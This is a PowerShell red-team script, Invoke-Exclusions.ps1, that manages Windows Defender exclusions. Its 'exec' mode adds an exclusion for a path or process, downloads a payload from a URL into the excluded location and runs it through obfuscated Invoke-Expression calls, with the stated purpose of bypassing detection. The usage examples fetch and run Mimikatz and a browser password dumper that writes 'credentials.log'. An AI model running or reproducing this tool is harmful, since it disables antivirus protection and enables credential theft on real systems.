<#
.SYNOPSIS
   [MITRE T1562.001] Manage Windows Defender Exclusions.

   Author: @r00t-3xp10it (ssa redteam)
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: Administrator privileges
   Optional Dependencies: Iwr, Get-MpPreference, Set-MpPreference,
                          Get-MpComputerStatus, Remove-MpPreference.
   PS cmdlet Dev version: v1.0.4

.DESCRIPTION
   This cmdlet allow users to manage ( query, create, delete ) Windows
   Defender exclusions: ExclusionExtension, ExclusionProcess, ExclusionPath.
   The files covered by the exclusion definition will be excluded from Windows
   Defender Real-time protection, monitoring, Scheduled scans, On-demand scans.

.NOTES
   This cmdlet in addition to add\remove exclusions from windows defender
   allows its users to download binaries (PE) that are being detected by the
   anti-virus and run it through the exclusion definition (bypassing detection)
   Use a comma (,) to split multiple exclusion entrys ( -exclude 'exe,vbs' )

   [Parameter URI limitations]
   This function creates the exclusion on Defender then downloads the -uri 'script\PE'
   to -exclude 'directory' and finally executes the script.ps1 OR the binary (PE) from
   the exclusion directory with the intent to evade detection ( download + execution )

   But 'execution' of payloads under -uri invocation is advised to be only under
   -type parameter 'ExclusionPath', because is exclusion is more comprehensive.

.Parameter Action
   Accepts arguments: query, add, exec, del (default: query)

.Parameter Type
   ExclusionExtension, ExclusionProcess, ExclusionPath (default: ExclusionPath)

.Parameter Exclude
   The path or PE path to exclude from defender scans (default: $Env:TMP)      

.Parameter Uri
   The binary.exe or cmdlet.ps1 url download link (default: Off)

.Parameter TimeOut
   The delay time (sec) to download\exec payload? (default: 5)

.Parameter Gui
   Use Out-GridView (GUI) to display results? (default: Off)

.EXAMPLE
   PS C:\> .\Invoke-Exclusions.ps1 -action "query"
   Get ALL Exclusions of Windows Defender (terminal)

.EXAMPLE
   PS C:\> .\Invoke-Exclusions.ps1 -action "query" -Gui "true"
   Get ALL Exclusions of Windows Defender (GUI)

.EXAMPLE
   PS C:\> .\Invoke-Exclusions.ps1 -action "add" -type "ExclusionExtension" -Exclude "exe"
   Exclude all EXE standalone executables from windows defender scans (extension exclusion)

.EXAMPLE
   PS C:\> .\Invoke-Exclusions.ps1 -action "add" -type "ExclusionPath" -Exclude "$Env:TMP"
   Exclude all items of %TEMP% directory from windows defender scans (path exclusion)

.EXAMPLE
   PS C:\> .\Invoke-Exclusions.ps1 -action "add" -type "ExclusionProcess" -Exclude "cmd"
   Exclude cmd.exe process ( and associated child processes ) from windows defender scans

.EXAMPLE
   PS C:\> .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionProcess" -Exclude "powershell" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Mimikatz.ps1"
   Exclude powershell process from windows defender scans (process exclusion), And Download\Execute -uri 'url' cmdlet stored to $Env:TMP directory

.EXAMPLE
   PS C:\> .\Invoke-Exclusions.ps1 -action "exec" -type "ExclusionPath" -Exclude "$Env:TMP" -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -Arguments "/stext credentials.log"
   Exclude all items of %TEMP% directory from windows defender scans (path exclusion), And Download\Execute -uri 'url' binary stored in $Env:TMP with arguments

.EXAMPLE
   PS C:\> .\Invoke-Exclusions.ps1 -action "del" -type "ExclusionProcess" -Exclude "powershell"
   Remove 'powershell' exclusion from windows defender 'ExclusionProcess' list

.INPUTS
   None. You cannot pipe objects into Invoke-Exclusions.ps1

.OUTPUTS
   * Manage Windows Defender Exclusions.
     => Query for ALL Defender Exclusions.

     DefenderVersion   : 4.18.2203.5
     RealTimeProtected : True
     IsTamperProtected : True

   Exclusion Type     Exclude From Scans                                 
   --------------     ------------------                                 
   ExclusionPath      'C:\Users\pedro\AppData\Local\Temp'
   ExclusionProcess   _Empty_
   ExclusionExtension _Empty_

.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/lib/WD-Bypass#invoke-exclusionsps1
   https://www.windowscentral.com/how-manage-microsoft-defender-antivirus-powershell-windows-10
   https://docs.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2022-ps
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Type="ExclusionPath",
   [string]$Exclude="$Env:TMP",
   [string]$Arguments="Off",
   [string]$Action="Query",
   [string]$Gui="Off",
   [string]$Uri="Off",
   [int]$TimeOut='5'
)


$CmdletVersion = "v1.0.4"
#Global variable declarations
#$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "@Invoke-Exclusions $CmdletVersion {SSA@RedTeam}"
$AdminShell = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
write-host "* Manage Windows Defender Exclusions." -ForegroundColor Green

#Build output DataTable!
$StdinTable = New-Object System.Data.DataTable
$StdinTable.Columns.Add("Exclusion Type")|Out-Null
$StdinTable.Columns.Add("Exclude From Scans")|Out-Null

#Make sure Windows Defender service is running
If([bool](Get-Service -Name "WinDefend") -Match '^(False)$')
{
   write-host "`n  x " -ForegroundColor Red -NoNewline
   write-host "Error: '" -ForegroundColor DarkGray -NoNewline
   write-host "WinDefend" -ForegroundColor Red -NoNewline
   write-host "' Service not found." -ForegroundColor DarkGray

   write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
   write-host "ok" -ForegroundColor DarkYellow -NoNewline
   write-host "].." -ForegroundColor Green
   return
}


If($Action -ieq "query")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Query for all Defender Exclusions

   .NOTES
      This function requires 'Get-MpPreference'
      and 'Get-MpComputerStatus' PS modules ..

   .OUTPUTS
      * Manage Windows Defender Exclusions.
        => Query for ALL Defender Exclusions.

        DefenderVersion   : 4.18.2203.5
        RealTimeProtected : True
        IsTamperProtected : True

      Exclusion Type     Exclude From Scans
      --------------     ------------------
      ExclusionPath      'C:\Users\pedro\AppData\Local\Temp'
      ExclusionProcess   _Empty_
      ExclusionExtension _Empty_
   #>

   $TypeList = @(
      "ExclusionPath",
      "ExclusionProcess",
      "ExclusionExtension"
   )

   #ProgressBar settings
   $CurrentItem = 0              #ProgressBar
   $PercentComplete = 0          #ProgressBar
   $TotalItems = $TypeList.Count #ProgressBar

   write-host "  => Query for ALL Defender Exclusions." -ForegroundColor DarkYellow
   #Make sure all modules required by this function are installed\loaded
   If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference") -iMatch '^(False)$')
   {
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: cmdlet requires '" -ForegroundColor DarkGray -NoNewline
      write-host "Get-MpPreference" -ForegroundColor Red -NoNewline
      write-host "' module." -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return   
   }


   ForEach($Token in $TypeList)
   {
      $CurrentItem++
      #ProgressBar of query percentage complete ...
      Write-Progress -Activity "Query: '$Token' Exclusions .." -Status "$PercentComplete% Complete:" -PercentComplete $PercentComplete
      $PercentComplete = [int](($CurrentItem / $TotalItems) * 100)
      Start-Sleep -Milliseconds 200

      #Check if 'MpPreference Type=' exists [True]
      If([bool]((Get-MpPreference).$Token) -iMatch '^(True)$')
      {
         #Extract key from MpPreference
         $GetKey = (Get-MpPreference).$Token
         #Adding values to output DataTable!
         $StdinTable.Rows.Add("$Token","'$GetKey'")|Out-Null
      }
      Else
      {
         #Adding values to output DataTable!
         $StdinTable.Rows.Add("$Token","_Empty_")|Out-Null
      }

   }


   #Extract more info from WinDefend
   $SelectAll = (Get-MpComputerStatus|Select-Object *)
   $AVversion = $SelectAll.AMServiceVersion
   $ITProtect = $SelectAll.IsTamperProtected
   $RTPEnable = $SelectAll.RealTimeProtectionEnabled

   #Display WinDefend information OnScreen
   write-host "`n  DefenderVersion   : " -NoNewline
   write-host "$AVversion" -ForegroundColor DarkGray

   write-host "  RealTimeProtected : " -NoNewline
   If($RTPEnable -Match 'False')
   {
      write-host "$RTPEnable" -ForegroundColor Green   
   }
   Else
   {
      write-host "$RTPEnable" -ForegroundColor DarkGray     
   }

   write-host "  IsTamperProtected : " -NoNewline
   If($ITProtect -Match 'False')
   {
      write-host "$ITProtect`n" -ForegroundColor Green   
   }
   Else
   {
      write-host "$ITProtect`n" -ForegroundColor DarkGray     
   }


   Start-Sleep -Milliseconds 1200
   #Display Output Table OnGui
   If($Gui -iMatch "(True|On)")
   {
      echo $StdinTable | Out-GridView -Title "@Invoke-Exclusions $CmdletVersion {SSA@RedTeam} - Windows Defender Exclusions"
   }

   #Display Output Table OnScreen
   $StdinTable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
      $stringformat = If($_ -Match '^(Exclusion Type)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      ElseIf($_ -Match "'")
      {
         @{ 'ForegroundColor' = 'DarkYellow' }      
      }
      Else
      {
         @{ 'ForegroundColor' = 'white' }
      }
      Write-Host @stringformat $_
   }

}


If($Action -iMatch "(add|exec)")
{
   
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create Windows Defender Exclusions

   .OUTPUTS
      * Manage Windows Defender Exclusions.
        => Create Windows Defender Exclusion.

           Action      : exec
           Type        : ExclusionPath
           Exclude     : C:\Users\pedro\AppData\Local\Temp
           Uri         : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe
           Arguments   : /stext credentials.log
           ExecTimeOut : 5 (seconds)

      + Creating exclusion: 'C:\Users\pedro\AppData\Local\Temp'

      Exclusion Type Exclude From Scans
      -------------- ------------------
      ExclusionPath  C:\Users\pedro\AppData\Local\Temp

      + Downloading : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe
      + Executing   : ChromePass.exe /stext credentials.log
   #>

   write-host "  => Create Windows Defender Exclusion." -ForegroundColor DarkYellow
   If(-not($AdminShell))
   {
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: function requires '" -ForegroundColor DarkGray -NoNewline
      write-host "administrative" -ForegroundColor Red -NoNewline
      write-host "' privileges." -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return   
   }

   #Make sure all modules required by this function are installed\loaded
   If([bool]((Get-Module -ListAvailable -Name ConfigDefender).ExportedCommands|findstr /C:"Get-MpPreference") -iMatch '^(False)$')
   {
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: cmdlet requires '" -ForegroundColor DarkGray -NoNewline
      write-host "Get-MpPreference" -ForegroundColor Red -NoNewline
      write-host "' module." -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return   
   }

   If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference") -iMatch '^(False)$')
   {
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: cmdlet requires '" -ForegroundColor DarkGray -NoNewline
      write-host "Set-MpPreference" -ForegroundColor Red -NoNewline
      write-host "' module." -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return  
   }

   #CmdLet Internal Parameter incoorencies ..
   If($Type -iMatch "^(ExclusionExtension|ExclusionProcess)$" -and $Exclude -Match '\\' -or $Exclude -Match '\.')
   {
      ## Function Limmitations
      # cmdline: Set-MpPreference -ExclusionExtension "exe" -Force
      # 1 - This exclusion must NOT contain paths {C:\path\path}
      # 2 - This exclusion must NOT contain extensions wiht a dot {.exe}
      # cmdline: Set-MpPreference -ExclusionProcess "powershell" -Force
      # 1 - This exclusion must NOT contain paths {C:\path\path}
      # 2 - This exclusion must NOT contain extensions with a dot {.exe}
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: This exclusion must NOT contain: '" -ForegroundColor DarkGray -NoNewline
      write-host "Paths OR Extensions (with a dot)" -ForegroundColor Red -NoNewline
      write-host "'" -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return
   }

   If($Type -iMatch "ExclusionPath" -and $Exclude -NotMatch '\\' -or $Exclude -Match '\.')
   {
      ## Function Limmitations
      # cmdline: Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force
      # 1 - This exclusion must contain paths {C:\path\path}
      # 2 - This exclusion must NOT contain extensions {.exe}
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: This exclusion must contain: '" -ForegroundColor DarkGray -NoNewline
      write-host "path\to\exclude" -ForegroundColor Red -NoNewline
      write-host "' only." -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return
   }


   #Display cmdlet settings OnScreen
   write-host "`n     Action      : $Action"
   write-host "     Type        : $Type"
   write-host "     Exclude     : $Exclude" -ForegroundColor DarkYellow
   write-host "     Uri         : $Uri"
   write-host "     Arguments   : $Arguments"
   write-host "     ExecTimeOut : $TimeOut (seconds)"

   write-host "`n+ " -ForegroundColor DarkYellow -NoNewline
   write-host "Creating exclusion: '" -ForegroundColor DarkGray -NoNewline
   write-host "$Exclude" -ForegroundColor DarkYellow -NoNewline
   write-host "'`n" -ForegroundColor DarkGray


   #Create exclusion in Defender [1º step]
   $cmdline = "Set-MpPreference -" + "$Type" + " `"$Exclude`" -Force" -join ''
   $cmdline|&('@ex' -replace '@','I')


   #Check if 'MpPreference Type=' exists [True]
   If([bool]((Get-MpPreference).$Type) -iMatch '^(True)$')
   {
      #Extract key from MpPreference
      $GetKey = (Get-MpPreference).$Type
      #Adding values to output DataTable!
      $StdinTable.Rows.Add("$Type","'$GetKey'")|Out-Null
   }
   Else
   {
      #Adding values to output DataTable!
      $StdinTable.Rows.Add("$Type","_Empty_")|Out-Null
   }

   #Display Output Table OnGui
   If($Gui -iMatch "(True|On)")
   {
      echo $StdinTable | Out-GridView -Title "@Invoke-Exclusions $CmdletVersion {SSA@RedTeam} - Windows Defender Exclusions"
   }

   #Display Output Table OnScreen
   $StdinTable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
      $stringformat = If($_ -Match '^(Exclusion Type)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      Else
      {
         @{ 'ForegroundColor' = 'white' }
      }
      Write-Host @stringformat $_
   }


   #TimeOut to allow exclusion to became 'active'
   Start-Sleep -Seconds $TimeOut


   if($Uri -ne "Off" -and $Type -iMatch "^(ExclusionPath)$")
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Download payload from uri [2º step]

      .NOTES
         Accepted types: ExclusionProcess,
         ExclusionPath, ExclusionExtension
      #>

      #Extract payload name + extension from -uri
      $PayloadName = $Uri.Split('/')[-1] # ChromePass.exe

      write-host "+ " -ForegroundColor DarkYellow -NoNewline
      write-host "Downloading: '" -ForegroundColor DarkGray -NoNewline
      write-host "$Uri" -ForegroundColor DarkYellow -NoNewline
      write-host "'" -ForegroundColor DarkGray

      ## Download URI to -Exclude location
      # Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
      iwr -uri "$Uri" -OutFile "${Exclude}\${PayloadName}"|Unblock-File   
   }
   ElseIf($Uri -ne "Off" -and $Type -iMatch "^(ExclusionProcess|ExclusionExtension)$")
   {
      ## NOTES: This function mandatory downloads payloads to %TMP%
      # Extract payload name + extension from -uri
      $PayloadName = $Uri.Split('/')[-1] # ChromePass.exe

      write-host "+ " -ForegroundColor DarkYellow -NoNewline
      write-host "Downloading: '" -ForegroundColor DarkGray -NoNewline
      write-host "$Uri" -ForegroundColor DarkYellow -NoNewline
      write-host "'" -ForegroundColor DarkGray

      ## Download URI to -Exclude location
      # Iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe" -OutFile "$Env:TMP\ChromePass.exe"
      iwr -uri "$Uri" -OutFile "${Env:TMP}\${PayloadName}"|Unblock-File     
   }
   Else
   {
      #PayloadName extracts the name form -exclude 'arg'
      $PayloadName = $Exclude.Split('\\')[-1] # Payload.exe
   }


   If($Arguments -ne "Off")
   {
      #Add arguments to $PayloadName variable
      $PayloadName = "$PayloadName $Arguments" # ChromePass.exe /stext credentials.log
   }


   If($Action -ieq "exec")
   {

      <#
      .SYNOPSIS
         Author: @r00t-3xp10it
         Helper - Execute payload [3º step]

      .NOTES
         Accepted types: ExclusionProcess,
         ExclusionPath, ExclusionExtension

      .OUTPUTS
         + Executing 'ChromePass.exe'
      #>

      $StartPath = (Get-Location).Path
      write-host "+ " -ForegroundColor DarkYellow -NoNewline
      write-host "Executing  : '" -ForegroundColor DarkGray -NoNewline
      write-host "$PayloadName" -ForegroundColor DarkYellow -NoNewline
      write-host "'`n" -ForegroundColor DarkGray

      if($Uri -NotMatch "Off" -and $Type -iMatch '(ExclusionPath)')
      {
         # Type    : ExclusionPath
         # uri     : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.exe
         # Exclude : C:\Users\pedro\AppData\Local\Temp
         # Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force

         If($Arguments -ieq "Off")
         {
            $ExecMe = "Start-Process " + "$PayloadName" -Join ''         
         }
         Else
         {
            $ExecMe = ".\" + "$PayloadName" -Join ''
         }

         $ExecMe = ".\" + "$PayloadName" -Join ''
         cd $Exclude                        # TMP
         $ExecMe|&('@ex' -replace '@','I')  # ChromePass.exe
         cd $StartPath                      # $pwd
      }
      ElseIf($Uri -NotMatch "Off" -and $Type -iMatch '(ExclusionProcess|ExclusionExtension)')
      {
         # Type    : ExclusionProcess|ExclusionExtension
         # uri     : https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/ChromePass.ps1
         # Exclude : powershell|ps1
         # Set-MpPreference -ExclusionProcess|ExclusionExtension "powershell|ps1" -Force

         ## NOTES: This function mandatory downloads payloads to %TMP%
         If($Arguments -ieq "Off")
         {
            $ExecMe = "Start-Process " + "$PayloadName" -Join ''         
         }
         Else
         {
            $ExecMe = ".\" + "$PayloadName" -Join ''
         }

         cd $Env:TMP                        # TMP
         $ExecMe|&('@ex' -replace '@','I')  # ChromePass.exe
         cd $StartPath                      # $pwd
      }
      ElseIf($Uri -Match "Off" -and $Type -iMatch 'ExclusionExtension')
      {
         # Type    : ExclusionExtension
         # uri     : Off
         # Exclude : exe
         # Set-MpPreference -ExclusionExtension "exe" -Force

         ## ERROR: We can NOT execute extensions (exe) ...
         write-host "`n  x " -ForegroundColor Red -NoNewline
         write-host "Executing error: There is no '" -ForegroundColor DarkGray -NoNewline
         write-host "Payload" -ForegroundColor Red -NoNewline
         write-host "' to execute." -ForegroundColor DarkGray

         write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
         write-host "ok" -ForegroundColor DarkYellow -NoNewline
         write-host "].." -ForegroundColor Green
         return
      }
      ElseIf($Uri -Match "Off" -and $Type -iMatch 'ExclusionProcess')
      {
         # Type    : ExclusionProcess
         # uri     : Off
         # Exclude : powershell
         # Set-MpPreference -ExclusionProcess "powershell" -Force

         ## ERROR: We can NOT execute whats allready running (powershell) ...
         write-host "`n  x " -ForegroundColor Red -NoNewline
         write-host "Executing error: We can NOT execute whats allready running (" -ForegroundColor DarkGray -NoNewline
         write-host "$Exclude" -ForegroundColor Red -NoNewline
         write-host ")" -ForegroundColor DarkGray

         write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
         write-host "ok" -ForegroundColor DarkYellow -NoNewline
         write-host "].." -ForegroundColor Green
         return   
      }
      ElseIf($Uri -Match "Off" -and $Type -iMatch 'ExclusionPath')
      {
         # Type    : ExclusionPath
         # uri     : Off
         # Exclude : C:\Users\pedro\AppData\Local\Temp
         # Set-MpPreference -ExclusionPath "C:\Users\pedro\AppData\Local\Temp" -Force

         ## ERROR: We can NOT execute directorys (folders) ...
         write-host "`n  x " -ForegroundColor Red -NoNewline
         write-host "Executing error: There is no '" -ForegroundColor DarkGray -NoNewline
         write-host "Payload" -ForegroundColor Red -NoNewline
         write-host "' to execute." -ForegroundColor DarkGray

         write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
         write-host "ok" -ForegroundColor DarkYellow -NoNewline
         write-host "].." -ForegroundColor Green
         return
      }
 
   }
}


If($Action -ieq "del")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Remove entrys from defender exclusions list

   .NOTES
      This function requires: Get-MpPreference,
      and Remove-MpPreference PS modules

   .OUTPUTS
      * Manage Windows Defender Exclusions.
        => Remove entrys from exclusions list.

        + Removing Entry: 'C:\Users\pedro\AppData\Local\Temp'

      Exclusion Type Exclude From Scans
      -------------- ------------------
      ExclusionPath  _Empty_
   #>

   write-host "  => Remove entrys from $Type" -ForegroundColor DarkYellow
   If(-not($AdminShell))
   {
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: function requires '" -ForegroundColor DarkGray -NoNewline
      write-host "administrative" -ForegroundColor Red -NoNewline
      write-host "' privileges." -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return   
   }

   If($Type -iNotMatch "^(ExclusionPath|ExclusionExtension|ExclusionProcess)$")
   {
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: wrong '" -ForegroundColor DarkGray -NoNewline
      write-host "exclusion type" -ForegroundColor Red -NoNewline
      write-host "' sellection .." -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return
   }

   #Make sure all modules required by this function are installed\loaded
   If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Get-MpPreference") -iMatch '^(False)$')
   {
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: cmdlet requires '" -ForegroundColor DarkGray -NoNewline
      write-host "Get-MpPreference" -ForegroundColor Red -NoNewline
      write-host "' Module.." -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return     
   }

   If([bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference") -iMatch '^(False)$')
   {
      write-host "`n  x " -ForegroundColor Red -NoNewline
      write-host "Error: cmdlet requires '" -ForegroundColor DarkGray -NoNewline
      write-host "Remove-MpPreference" -ForegroundColor Red -NoNewline
      write-host "' Module.." -ForegroundColor DarkGray

      write-host "`n* Exit Invoke-Exclusions cmdlet [" -ForegroundColor Green -NoNewline
      write-host "ok" -ForegroundColor DarkYellow -NoNewline
      write-host "].." -ForegroundColor Green
      return     
   }


   write-host "`n  + " -ForegroundColor DarkYellow -NoNewline
   write-host "Removing Entry: '" -ForegroundColor DarkGray -NoNewline
   write-host "$Exclude" -ForegroundColor DarkYellow -NoNewline
   write-host "'`n" -ForegroundColor DarkGray -NoNewline
   Start-Sleep -Milliseconds 500

   #Check for entry existence
   If((Get-MpPreference).$Type -eq $null)
   {
      write-host "  x " -ForegroundColor Red -NoNewline
      write-host "Error: none '" -ForegroundColor DarkGray -NoNewline
      write-host "$Exclude" -ForegroundColor Red -NoNewline
      write-host "' exclusion(s) found .." -ForegroundColor DarkGray
   }


   <#
   .SYNOPSIS
      Recursive remove entrys from exclusion list?

      $Paths=(Get-MpPreference).ExclusionPath
      ForEach($Path in $Paths){Remove-MpPreference -ExclusionPath $Path -Force}   
   #>

   write-host ""
   #Remove entry from exclusion list
   $cmdline = "Remove-MpPreference -" + "$Type" + " `"$Exclude`" -Force" -join ''
   $cmdline|&('@ex' -replace '@','I')


   #Check if 'MpPreference Type=' exists [True]
   If([bool]((Get-MpPreference).$Type) -iMatch '^(True)$')
   {
      #Extract key from MpPreference
      $GetKey = (Get-MpPreference).$Type
      #Adding values to output DataTable!
      $StdinTable.Rows.Add("$Type","'$GetKey'")|Out-Null
   }
   Else
   {
      #Adding values to output DataTable!
      $StdinTable.Rows.Add("$Type","_Empty_")|Out-Null
   }

   #Display Output Table OnGui
   If($Gui -iMatch "(True|On)")
   {
      echo $StdinTable | Out-GridView -Title "@Invoke-Exclusions $CmdletVersion {SSA@RedTeam} - Windows Defender Exclusions"
   }

   #Display Output Table OnScreen
   $StdinTable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
      $stringformat = If($_ -Match '^(Exclusion Type)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      ElseIf($_ -Match "'")
      {
         @{ 'ForegroundColor' = 'DarkYellow' }      
      }
      Else
      {
         @{ 'ForegroundColor' = 'white' }
      }
      Write-Host @stringformat $_
   }

}